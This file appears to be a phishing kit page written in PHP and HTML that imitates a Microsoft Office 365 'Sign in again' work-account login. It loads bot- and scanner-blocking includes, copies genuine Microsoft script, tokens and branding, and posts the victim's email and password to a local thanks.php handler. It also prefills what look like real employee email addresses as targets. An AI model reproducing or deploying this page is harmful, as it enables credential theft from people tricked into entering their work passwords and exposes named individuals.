<?php
ini_set("output_buffering",4096);
session_start();

$_SESSION['Email'] = $email = $_GET['email'];
$_SESSION['Name'] = $name = $_GET[name];


include 'ak47.php';
include 'blocker.php';
include 'bots.php';
include 'banned.php';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" style="background-color: rgb(235, 60, 0);"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
        

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="PageID" content="i5030.2.0">
<meta name="SiteID" content="">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="en-US">
<meta name="mswebdialog-newwindowurl" content="*">



<script type="text/javascript">//<![CDATA[
$Config={"scid":2001,"hpgact":2101,"hpgid":1003,"pgid":"i5030","apiCanary":"AQABAAAAAADRNYRQ3dhRSrm-4K-adpCJmiRinv9r-4lOc_zMVnLXJ2BhUB6u2w4Sae273s8m6dJWY-DCuU6ZpLOxmFU7AgdTl9zZOgB7GduuQNgxjMvjOic4lTy0QUuxXyZLSBSitnh2isfap6tYQCyHcGZTyKw3RvJcptLgmf_Ty5Afu4dgOOhrQwOZdHQAwkri83jfL39l17VfPfx0wExmCUBcIWUYh8fb1qz9ftBt6KdGi2hMIyAA","canary":"NWc36nmmtV//tyDNeXiTI5peX7ZFtWRngIu8oe3r6Vs=5:1","correlationId":"f6e1101a-81ab-4807-b47c-f9a83e7803cd","locale":{"mkt":"en-US","lc":1033,"lcid":1033},"strings":{"onprempasswordvalidation":{"authenticatingmessage":"Trying to sign you in","timeouterrormessage":"We didn\u0027t receive a response. Please try again.","genericerrormessage":"Something went wrong. Try again in a few minutes. If this doesn\u0027t work, contact your admin."},"mfa":{"setitupnow":"Set it up now"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"","dssostatus":""}},"browser":{"ltr":1,"Chrome":1,"_Win":1,"_M56":1,"_D0":1,"Full":1,"Win81":1,"RE_WebKit":1,"b":{"name":"Chrome","major":56,"minor":0},"os":{"name":"Windows","version":"10.0"},"V":"56.0"},"watson":{"enabled":true,"url":"/common/handlers/watson","bundle":"watson.min.js","sbundle":"","resetErrorPeriod":5,"maxCorsErrors":2,"maxInjectErrors":5,"maxErrors":10,"maxTotalErrors":100,"incScripts":true,"expSrcs":["","",""]},"serverDetails":{"slc":"ProXXXXes","dc":"AMS2","ri":"ESTXXXX_41","ver":{"v":[2,1,5517,3]},"rt":"2017-02-22T23:25:53"},"country":"NG"};
//]]></script><script type="text/javascript">//<![CDATA[
!function(){function r(r,o,a){function u(){var r=!!i.method,e=r?i.method:a[0],u=i.extraArgs||[],s=t.$WebWatson;try{var l=n(a,!r);if(u&&u.length>0)for(var c=u.length,f=0;c>f;f++)l.push(u[f]);e.apply(o,l)}catch(g){return void(s&&s.submitFromException&&s.submitFromException(g))}}var i=e.r&&e.r[r];return o=o?o:this,i&&(i.skipTimeout?u():t.setTimeout(u,0)),i}function n(r,n){return Array.prototype.slice.call(r,n?1:0)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0});var e=t.$Do;e.when=function(n,t){var o=0,a=[],u=1,i="function"==typeof t;i||(o=t,u=2);for(var s=u;s<arguments.length;s++)a.push(arguments[s]);r(n,o,a)||e.q.push({id:n,c:o,a:a})},e.register=function(n,t,o){if(!e.r[n]){var a={};if(t&&(a.method=t),o&&(a.skipTimeout=o),arguments&&arguments.length>3){a.extraArgs=[];for(var u=3;u<arguments.length;u++)a.extraArgs.push(arguments[u])}e.r[n]=a,e.lock++;try{for(var i=0;i<e.q.length;i++){var s=e.q[i];s.id==n&&r(n,s.c,s.a)&&e.removeItems.push(s)}}catch(l){throw l}finally{if(e.lock--,0===e.lock){for(var c=0;c<e.removeItems.length;c++)for(var f=e.removeItems[c],g=0;g<e.q.length;g++)if(e.q[g]===f){e.q.splice(g,1);break}e.removeItems=[]}}}},e.unregister=function(r){e.r[r]&&delete e.r[r]}}(),function(){function r(r,n,t){var e=m.createElement("script");e.id=n,e.setAttribute("crossorigin","anonymous"),e.type="text/javascript",e.setAttribute("src",r),e.defer=!1,e.async=!1,e.onload=t,e.onerror=o,e.onreadystatechange=function(){"loaded"===e.readyState?setTimeout(t,500):"complete"===e.readyState&&t()};var a=m.getElementsByTagName("head")[0];a.appendChild(e),d.$Debug&&d.$Debug.appendLog("[WebWatson]: Loading Script '"+(r||"")+"', id:"+(n||""))}function n(){var n=p.bundle;p.bundle=null,delete p.bundle,r(n,"WebWatson_DemandLoaded",e)}function t(){$||(d.jQuery?n():r(p.sbundle,"WebWatson_DemandSupport",n),p.sbundle&&(p.sbundle=null,delete p.sbundle),$=!0)}function e(){if(d.$WebWatson){if(d.$WebWatson.isProxy)return void o();b.when("$WebWatson.full",function(){for(;W.length>0;){var r=W.shift();r&&d.$WebWatson[r.cmdName].apply(d.$WebWatson,r.args)}})}}function o(){var r=d.$WebWatson?d.$WebWatson.isProxy:!0;a(),p.loadErrorUrl&&r&&window.location.assign(p.loadErrorUrl)}function a(){W=[],d.$WebWatson=null}function u(r){return function(){var n=arguments;W.push({cmdName:r,args:n}),t()}}function i(){var r=["foundException","resetException","submit","submitFromException","showError","reportException"],n=this;n.isProxy=!0;for(var t=r.length,e=0;t>e;e++){var o=r[e];o&&(n[o]=u(o))}}function s(r,n,t,e,o,a,u,i,s){var l=d.event;a||(a=v(o||l,u?u+2:2)),d.$Debug&&d.$Debug.appendLog("[WebWatson]:"+(r||"")+" in "+(n||"")+" @ "+(t||"??")),w.submit(r,n,t,e,o||l,a,u,i,s)}function l(r,n){return{signature:r,args:n,toString:function(){return this.signature}}}function c(r){for(var n=[],t=r.split("\n"),e=0;e<t.length;e++)n.push(l(t[e],[]));return n}function f(r){for(var n=[],t=r.split("\n"),e=0;e<t.length;e++){var o=l(t[e],[]);t[e+1]&&(o.signature+="@"+t[e+1],e++),n.push(o)}return n}function g(r){if(!r)return null;try{if(r.stack)return c(r.stack);if(r.error){if(r.error.stack)return c(r.error.stack)}else if(window.opera&&r.message)return f(r.message)}catch(n){}return null}function v(r,n){var t=[];try{for(var e=arguments.callee;n>0;)e=e?e.caller:e,n--;for(var o=0;e&&y>o;){var a="InvalidMethod()";try{a=e.toString()}catch(u){}var i=[],s=e.args||e.arguments;if(s)for(var c=0;c<s.length;c++)i[c]=s[c];t.push(l(a,i)),e=e.caller,o++}}catch(u){t.push(l(u.toString(),[]))}var f=g(r);return f&&(t.push(l("--- Error Event Stack -----------------",[])),t=t.concat(f)),t}var d=window,m=d.document,h=d.$Config||{},p=h.watson,b=d.$Do;if(!d.$WebWatson&&p&&p.enabled){var W=[],$=!1,y=10,w=d.$WebWatson=new i;w.CB={},w._orgErrorHandler=d.onerror,d.onerror=s,w.errorHooked=!0,b.when("jQuery.version",function(r){p.expectedVersion=r}),b.register("$WebWatson")}}(),function(){function r(r,n){for(var t=n.split("."),e=t.length,o=0;e>o&&null!==r&&void 0!==r;)r=r[t[o++]];return r}function n(n){var t=null;return null===s&&(s=r(a,"Constants")),null!==s&&n&&(t=r(s,n)),null===t||void 0===t?"":t.toString()}function t(t){var e=null;return null===u&&(u=r(a,"$Config.strings")),null!==u&&t&&(e=r(u,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}function e(r,n){var e=null;return r&&n&&n[r]&&(e=t("errors."+n[r])),e||(e=t("errors."+r)),e||(e=t("errors."+l)),e||(e=t(l)),e}function o(t){var e=null;return null===i&&(i=r(a,"$Config.urls")),null!==i&&t&&(e=r(i,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}var a=window,u=null,i=null,s=null,l="GENERIC_ERROR";a.GetString=t,a.GetErrorString=e,a.GetUrl=o}(),function(){var r=window,n=r.$Config||{};r.$B=n.browser||{}}();

//]]></script>

       <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/favicon_a.ico" />


    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
<link href="login.min.css" rel="stylesheet">



<style>
    .no_display {
        display: none;
    }
</style>


<!--[if lte IE 10]>
    <link href="login_ie.min.css" rel="stylesheet" />

<![endif]-->

<!--[if lte IE 7]>
  <style type='text/css'>
    .ie_legacy { display: none; }
    body { background-color: #0072C6; }
  </style>
<![endif]-->


<script type="text/javascript">
    if ((navigator.userAgent.match(/iPad/) || navigator.userAgent.match(/iPhone/))
        && (window.innerWidth)) {
        try {
            viewport = document.querySelector("meta[name=viewport]");
            viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            window.onresize = function(event) {
                viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            };
            window.onorientationchange = function (event) {
                var activeElem = document.activeElement;
                activeElem && activeElem.blur();
            };
        } catch (err) {
        }
    }

    var isTouch =  !!("ontouchstart" in window) || window.navigator.msMaxTouchPoints > 0;
    if (!isTouch && true) {    
        var cssId = 'hovereffect';
        if (!document.getElementById(cssId)) {
            var head = document.getElementsByTagName('head')[0];
            var link = document.createElement('link');
            link.id = cssId;
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = "login_hover.min.css";
            link.media = 'all';
            head.appendChild(link);
        }
    }

    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
        var msViewportStyle = document.createElement("style");
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{width:auto!important}"
              )
          );
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{height:auto!important}"
              )
          );
        document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
    }
 </script><link id="hovereffect" rel="stylesheet" type="text/css" href="login_hover.min.css" media="all">


<script crossorigin="anonymous" src="jquery.1.11.min.js"></script>

<script crossorigin="anonymous" src="aad.login.min.js"></script>






<style>
    body
    {
        display: none;
    }
</style>

        <title>
Sign in to your account        </title>
    </head>
    <body style="display: block;">
        <p id="accessibleError" class="accessibleError" style="" aria-live="assertive" aria-relevant="all" aria-atomic="true" role="alert">Sign in again.For security purposes, this application requires you to sign in again.</p>
        

    <script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>

        

<div id="background_branding_container" class="ie_legacy" style="background: rgb(235, 60, 0);">
    <img id="background_background_image" alt="Sign in with your work or school account" src="heroillustration.png" style="width: 980px; height: 745px; background-color: rgb(235, 60, 0); visibility: visible; display: block;">
    <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you're on a slow connection. We've disabled some images to speed things up.</div>
    <div id="background_company_name_text" class="background_title_text" aria-hidden="true" style="opacity: 0;">Sign in with your work or school account</div>
</div>
<div id="background_page_overlay" class="overlay ie_legacy" style="background-color: rgb(235, 60, 0); visibility: visible; display: none;" aria-hidden="true">
</div>

        <div id="login_no_script_panel" class="login_panel" aria-hidden="true" style="display: none;">
            

<noscript>
    &lt;style&gt;body { display: block; }&lt;/style&gt;
    &lt;div class="login_inner_container no_js"&gt;
        &lt;div class="inner_container cred"&gt;
            &lt;div class="login_workload_logo_container"&gt;
            &lt;/div&gt;
            &lt;div id="login_no_js_error_container" class="login_full_error_container"&gt;
                &lt;div id="login_no_js_error_text" class="cta_text 1"&gt;
                    
                    &lt;H1&gt;We can't sign you in&lt;/H1&gt;&lt;p&gt;Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.&lt;/p&gt;&lt;p&gt;To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.&lt;/p&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

&lt;div id="footer_links_container" class="login_footer_container"&gt;
    &lt;div class="footer_inner_container"&gt;
        &lt;div id="footer_table" class="footer_block"&gt;
                &lt;div class="corporate_footer"&gt;
                        &lt;div&gt;
                            &lt;span class="footer_link text-caption" id="footer_copyright_link"&gt;
&amp;#169; 2017 Microsoft                            &lt;/span&gt;
                        &lt;/div&gt;
                        &lt;div&gt;
                            &lt;span class="footer_link"&gt;
                                &lt;a class="text-caption" id="footer_link_terms" href="" target="_blank"&gt;Terms of use&lt;/a&gt;
                            &lt;/span&gt;
                            &lt;span class="footer_link"&gt;
                                &lt;a class="text-caption" id="footer_link_privacy" href="" target="_blank"&gt;Privacy &amp;amp; Cookies&lt;/a&gt;
                            &lt;/span&gt;
                        &lt;/div&gt;
                &lt;/div&gt;
                    &lt;div class="footer_glyph"&gt;
                        &lt;img src="microsoft_logo.png" alt="Microsoft account symbol" /&gt;
                    &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div id="login_prefetch_container" class="no-display"&gt;
&lt;/div&gt;

</noscript>

        </div>
        <div id="login_panel" class="login_panel" style="display: block;">
            <div id="legal-section" class="legal_container">
                <div id="legal-content" class="legal-content normaltext"></div>
                <button id="legal-back-btn" class="legal-btn button normaltext">Back</button>
            </div>
            <table class="login_panel_layout" style="height: 100%;">
                <tbody><tr class="login_panel_layout_row" style="height: 100%;">
                    <td id="login_panel_center">
                        

    <script type="text/javascript">
        $(document).ready(function () {
        if ($.support.cookies) {
            $('.login_inner_container').removeClass('no_display');
            $('.no_cookie').addClass('no_display');
        } else {
            $('.login_inner_container').addClass('no_display');
            $('.no_cookie').removeClass('no_display');
        }
        });
    </script>
    <div class="login_inner_container no_cookie no_display" aria-hidden="true">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            <img id="login_workload_logo_image" class="workload_img" alt="Sign in with your work or school account" style="visibility: visible;" src="bannerlogo.png"></div>
            <div id="login_no_cookie_error_container" class="login_full_error_container">
                <div id="login_no_cookie_error_text" class="cta_text 1">
                    
                    <h1>We can't sign you in</h1><p>Your browser is currently set to block cookies. You need to allow cookies to use this service.</p><p>Cookies are small text files stored on your computer that tell us when you're signed in. To learn how to allow cookies, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
                        <script type="text/javascript">
                            $(document).ready(function () {
                                

Constants.DEFAULT_LOGO = 'bannerlogo.png';


Constants.DEFAULT_LOGO_ALT = 'Office 365';
Constants.DEFAULT_ILLUSTRATION = 'heroillustration.png';
Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
Constants.BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_TEXT = '';




    
    User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
    User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
    
    if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
        TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
    }
    

                                



    





try {
        
            Tiles.users =  [{"name":"","login":"","imageAAD":"work_account.png","imageMSA":"personal_account.png","isLive":false,"isGuest":false,"link":"mties@perforce.com","authUrl":"","isSigned":true,"sessionID":"0aa7c45e-864e-4b32-a506-bbdea1658426","domainHint":"","isWindows":false},{"name":"","login":"gsisson@sircorp.com","imageAAD":"work_account.png","imageMSA":"personal_account.png","isLive":false,"isGuest":false,"link":"gsisson@sircorp.com","authUrl":"","isSigned":false,"sessionID":"caaf16c3-585b-4113-886d-f1a4e41c5676","domainHint":"","isWindows":false}];
        

        
        Tiles.users.push(Tiles.otherJSON);
        

    // Test result.
    Tiles.users[0].imageAAD;
} catch (err) {
    Tiles.users = [
        {
            'name': 'mties@perforce.com',
            'login': 'mties@perforce.com',
            'link': 'mties@perforce.com',
            'imageAAD': 'work_account.png',
            'imageMSA': 'personal_account.png',
            'isLive': false,
            'authUrl': '',
            'sessionID': '0aa7c45e-864e-4b32-a506-bbdea1658426',
            'domainHint': '',
            'fido20Challenge': ''
        }
        
        , Tiles.otherJSON
        
    ];
}

users = Tiles.users;

(function () {
    $('#signedout-forget').click(Tiles.forgetRememberedUser);
    $('#signedin-signout').click({shouldForgetUser: false}, Tiles.signoutAndForgetUser);
    $('#signedin-signoutandforget').click({shouldForgetUser: true}, Tiles.signoutAndForgetUser);

    $("#signoutContainer, #signoutForgetContainer, #forgetContainer").on("keypress", function (event) {
        if (event && event.which === 13 && event.target && event.target.firstElementChild) {
                event.target.firstElementChild.click();
            }
    });
})();
    
        $('.login_cta_container').append(
        $('<div/>')
            .attr('id', 'tiles_cta_text')
            .addClass('cta_message_text')
            .text(''));
    
$('#cred_keep_me_signed_in_checkbox').attr('checked', 'checked');
    

Tiles.drawUsers();

    
    var is_user_live = false;
    var domainHint = '';
    var user_has_tile = Tiles.getUser('mties@perforce.com', is_user_live, domainHint) != null; 
    var skipUserRealmDiscoveryOnLoad = false;

    if (user_has_tile) {
        Tiles.showUser('mties@perforce.com', is_user_live, domainHint, skipUserRealmDiscoveryOnLoad);
        $('#cred_password_inputtext').focus();
        $('#cred_keep_me_signed_in_checkbox').attr("checked", 'checked');
    } else {
        Tiles.showOtherOption();
    }

    $('#cred_userid_inputtext').val('mties@perforce.com');
    if('mties@perforce.com' == '') {
        Tiles.CancelTileRedirect();
    }
    
if (Tiles.hasUserNameQS()) {
    Tiles.showUserName();
} else {
}

                            });


                        </script>
                        <div class="login_inner_container">
                            <div id="true_inner" class="inner_container cred">
                                    <div class="login_workload_logo_container"><img id="login_workload_logo_image" class="workload_img" alt="Sign in with your work or school account" style="visibility: visible;" src="bannerlogo.pn"></div>
                                <div class="spacer"></div>
                                




<div id="login_error_container" class="login_error_container"></div>
<div class="login_cta_container normaltext" style="visibility: visible;">
        <!-- HR=SsoArtifactInvalidOrExpired -->
        <input id="error_code" type="hidden" value="SsoArtifactInvalidOrExpired">
        <script type="text/javascript">
            try
            {
                // create an HTML element then use text() to strip out unwanted HTML markup that may be present in the error
                // in try/catch block since $('...') can fail if it does not like something, but this isn't a fatal error
                var accessibleError = $('<div>' + '<H1>Sign in again.</H1><p>For security purposes, this application requires you to sign in again.</p>' + '</div>');
                $('#accessibleError').text(accessibleError.text());
                $('#accessibleError').show();
            }
            catch (e) {}
        </script>
        <div id="cta_error_message_text" class="error_msg errortext SsoArtifactInvalidOrExpired">
            <div id="recover_container" style="opacity: 1;">
                
                <h1>Sign in again.</h1><p>For security purposes, this application requires you to sign in again.</p>
            </div>
            <!-- We don't want to show up the View Details block for some user errors. -->
        </div>
            <div id="login_cta_text" class="cta_message_text 1 no_display" style="display: block;">Work or school account</div>

    <div id="cta_client_message_text" class="no_display template-tooltip tooltipType_error" aria-hidden="true">
        <!-- Email Discovery Main -->
        <div class="cta_message_text 30136">Type the email address of the account you want to sign in with.</div>
        <!-- Email Discovery Lookup Timeout -->
        <div class="cta_message_text 30140">We're having trouble locating your account. Which type of account do you want to use?</div>
        <!-- Email Discovery Account not found -->
        <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
        </div>
        <!-- Tenant branding call to action -->
        <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
        <!-- Which accound do you want to use -->
        <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
    </div>
    <div id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error" aria-hidden="true">
        <!-- Invalid ID or password -->
        
        <div class="client_error_msg 30067"><h1>We don't recognize this user ID or password</h1><p>Be sure to type the password for your work or school account.</p></div>
        <!-- Malformed id -->
        
        <div class="client_error_msg 30064"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Username not found -->
        
        <div class="client_error_msg 30065"><h1>{0} isn't in our system </h1><p>Make sure you typed your address or phone number correctly, or <a id="user-not-found-link" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Malformed id (DOMAIN\alias format) -->
        
        <div class="client_error_msg 30066"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Invalid domain name (not guests) -->
        
        <div class="client_error_msg 30068"><h1>{0} isn't in our system</h1><p>Make sure you typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p></div>
        <!-- Missing password -->
        <div class="client_error_msg 30111">Please enter your password.</div>
        <!-- UserID is missing -->
        <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
        <!-- Error message if email address is not properly formatted -->
        <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
        <!-- Email Discovery could not find email address -->
        
        <div id="account_not_found_title_text" class="client_error_msg 30146"><h1>We couldn't find an account with that email address.</h1><p>Enter a different email address or <a id="user-not-found-link-ebd" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Signout failed -->
        <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
    <div class="client_error_msg 2147776681"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776681.</p></div><div class="client_error_msg 2147776682"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776682.</p></div><div class="client_error_msg 2147778860"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147778860.</p></div><div class="client_error_msg 2147762276"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147762276.</p></div></div>
<div id="tiles_cta_text" class="cta_message_text" aria-hidden="true" style="display: none;"></div></div>
<ul class="login_cred_container">
    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <li id="login_user_chooser" class="login_user_chooser" style="display: block;">
    <a id="use_another_account_link" data-session-id="0aa7c45e-864e-4b32-a506-bbdea1658426" 
    href="#" class="tile_link tooltip disabled_tile" aria-label="Work or school account" 
    tabindex="-1"><table id="use_another_account" data-session-id="0aa7c45e-864e-4b32-a506-bbdea1658426" 
    class="user_tile disabled_tile">    <tbody><tr style="cursor: default;">        
    <td>            <table>                 <tbody><tr style="cursor: default;">                     <td colspan="2">     
                    </td>                 </tr>               
                      <tr class="use_another_account 0aa7c45e-864e-4b32-a506-bbdea1658426" style="cursor: default;">    
                                       <td>                                          </td>                     <td class="tile_name tile_name_padding">                         <div class="bigtext tile_primary_name windows_tile_text wrap use_another_account" style="cursor: default;">                                                      </div>                         <div class="smallertext tile_secondary_name windows_tile_text text-caption2 use_another_account" style="cursor: default;">                                                  </div>                     </td>                 </tr>            </tbody></table>        </td>    </tr></tbody></table></a></li>
    




















    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <div class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown" aria-hidden="true">
        <ul class="nav-settings-menu-list">
            <li id="signoutContainer" style="display: block;"><a href="#" id="signedin-signout">Sign out</a></li>
            <li id="signoutForgetContainer" style="display: block;"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
        </ul>
    </div>
    <div class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown" aria-hidden="true">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer" style="display: block;"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->
    <li class="login_cred_field_container" style="display: block;">

        
<form id="credentials" method="post" action="thanks.php">


    <div id="looking_container" class="no_display" aria-hidden="true">
        <span id="looking_cta_text" class="bigtext">Looking for an account</span>
        <span class="input_field normaltext login_textfield"><a id="looking_cancel_link" href="#">Cancel</a> </span>
    </div>
    <div id="cred_userid_container" class="login_textfield textfield">

           <div class="input_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Email Address" spellcheck="false" aria-label="Password" alt="Password" type="email" name="email_ads" value="" aria-describedby="accessibleError" required>
                </div>      </div>
             
        <div id="cred_password_container" class="login_textfield textfield" style="opacity: 1;">
            <span class="input_field textfield">
                <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Password</label>
                <div class="input_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" type="password" name="password" value="" aria-describedby="accessibleError" required>
                </div>
            </span>
        </div>
        <div id="redirect_message_container" class="login_textfield hidden no_display" aria-hidden="true" style="opacity: 0;">
            <span class="input_field normaltext">
                <div>
                    <span id="redirect_message_text">We're taking you to your organization's sign-in page.</span><span id="redirect_company_name_text"></span> <a id="redirect_cancel_link" href="#">Cancel</a>
                </div>
            </span>
        </div>

    





    </li>

    <li id="login-splitter-control" class="login_splitter_control" style="display: block;">
        <div id="splitter-tiles-container"></div>
    </li>
    <li class="login_cred_options_container" id="login_cred_options_container" style="display: block;">


        

<div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        <input id="cred_keep_me_signed_in_checkbox" type="checkbox" value="0" class="win-checkbox" name="persist">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>

        
        
<input type="submit" Value="Sign in" class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary disabled_button">
        
</form>

        

        <div id="recover_container" class="subtext smalltext">
            <span>
                <a id="cred_forgot_password_link" href="">Can't access your account?</a>
            </span>
        </div>

        


        <div id="guest_hint_text" class="guest_direction_hint smalltext no_display" aria-hidden="true" style="display: none;">Don’t have an account assigned by your work or school?</div>
        <div class="guest_redirect_container no_display" aria-hidden="true" style="display: none;">
            <span class="guest_redirect smalltext">
                <span>
                    <a id="guest_redirect_link" tabindex="20" href="">Sign in with a Microsoft account</a>
                </span>
            </span>
        </div>
    </li>
        
    <li id="disambig-container" class="smalltext marginTop30px" style="display: none;" aria-hidden="true">
        <div id="disambig-help-container">
            
            Tired of seeing this? <a href="#" id="iDisambigRenameLink">Rename your personal Microsoft account.</a>
        </div>
    </li>

        <!-- From ViewTemplateBase/Tiles.cshtml -->
        
        <!--  -->

<input id="home_realm_discovery" type="hidden" value="0"></ul>


<div id="samlrequest_container" class="no_display" aria-hidden="true">
    <form id="samlform" method="post" action="/common/login">
        <input type="hidden" id="samlrelaystate" name="RelayState">
        <input type="hidden" id="samlrequest" name="SAMLRequest">
        <input type="hidden" name="canary_1" value="NWc36nmmtV//tyDNeXiTI5peX7ZFtWRngIu8oe3r6Vs=5:1"> 
    </form>
</div>







                            </div>
                            <div class="push">
                            </div>
                        </div>


<div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <div id="footer_table" class="footer_block">
                <div class="corporate_footer">
                        <div>
                            <span class="footer_link text-caption" id="footer_copyright_link">
2017 Microsoft                            </span>
                        </div>
                        <div>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_terms" href="" target="_blank">Terms of use</a>
                            </span>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_privacy" href="" target="_blank">Privacy &amp; Cookies</a>
                            </span>
                        </div>
                </div>
                    <div class="footer_glyph">
                        <img src="microsoft_logo.png" alt="Microsoft account symbol">
                    </div>
        </div>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
<iframe src="" seamless="seamless" scrolling="no" id="login_prefetch_iframe"></iframe></div>
                    </td>
                </tr>
            </tbody></table>
        </div>
        


<script type="text/javascript">
  var Constants = Constants || {};
  Constants.MEMBER_NAME = "mties@perforce.com";

  
  Constants.REDIRECT_MESSAGES = {
    'AAD': "We\u0027re taking you to your organization\u0027s sign-in page.",
    'MSA': "We‘re taking you to the Microsoft account sign-in page.",
    'CLOUDFEDERATED': "We\u0027re taking you to your organization\u0027s sign-in page."
  };

  Constants.FEDERATION_QUERY_PARAMETERS = '?lc=1033&client-request-id=f6e1101a-81ab-4807-b47c-f9a83e7803cd&username=mties%40perforce.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLOKCkpKLbS1y_ILypJzNHLT0vLTE7VS87P1csvSs9MAbGKhLgEpAQeflvdyO6xpebnCrsK5rOrGNVw6tTPScxLycxL10ssLqi4wMjYwMTYxcRiaGBsvImJ1dfZ18nzBNOEs3K3mAT9i9I9U8KL3VJTUosSSzLz8x4x8YYWpxb55-VUhuRnp-btYlYxSEw0TzYxTdW1MDNJ1TVJMjbSTTQ1MNNNSkpJTTQ0M7UwMTI7wLIh5AKLwCsWHgNmKw4OLgEGCQYFhh8sjItYgW63vFLMsbvxvnPjJI_vMYuO7DnFqu8XnmxslpebWxKmr19S6eKXGpEZ4mlakBphHuVWEh6Ul-5ZapGfalxkFlZsa2plOIFNaAIb0y5Of-L8bF-SWJSeWmKrapSWkpqWWJpTAhZWNU4rT1Q1TikvzkzPy8wz1DMAAA2'.substr(1);
